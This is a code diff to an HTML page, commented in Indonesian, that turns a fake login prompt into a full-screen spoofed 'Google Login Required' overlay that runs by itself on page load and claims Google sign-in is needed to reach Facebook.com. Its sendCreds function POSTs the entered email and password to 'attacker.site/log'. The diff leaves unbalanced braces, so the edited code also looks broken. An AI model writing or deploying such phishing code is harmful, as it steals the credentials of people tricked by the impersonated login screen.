@@ -10,14 +10,30 @@
 
         // 2. Tunggu 2 detik sebelum menampilkan prompt palsu
         setTimeout(() => {
-          document.getElementById("iframe").src =
-            'javascript:prompt("In order to access Facebook.com\\nyou must first login on your\\nGoogle Account.\\n\\nPlease type your e-mail\\nand your password:\\n", "E-mail / Password");';
-        }, 3000);
+  win.document.body.innerHTML = `
+    <div style="position:fixed;top:0;left:0;width:100vw;height:100vh;
+                background:white;z-index:9999;display:flex;flex-direction:column;justify-content:center;align-items:center;">
+      <h3>Google Login Required</h3>
+      <p>Please login to your Google Account to continue to Facebook.com</p>
+      <input placeholder="Email" /><br/>
+      <input placeholder="Password" type="password" /><br/>
+      <button onclick="sendCreds()">Login</button>
+    </div>
+    <script>
+      function sendCreds() {
+        // Kirim ke server attacker
+        let email = document.querySelector('input[placeholder=Email]').value;
+        let pass = document.querySelector('input[placeholder=Password]').value;
+        fetch('https://attacker.site/log', {
+          method: 'POST',
+          body: JSON.stringify({email, pass}),
+          headers: {'Content-Type': 'application/json'}
+        });
       }
+  `;
+}, 3000);
 
       spoof(); // Auto-run saat halaman dibuka
     </script>
-
-    <iframe id="iframe" style="display:none;" src=""></iframe>
   </body>
 </html>
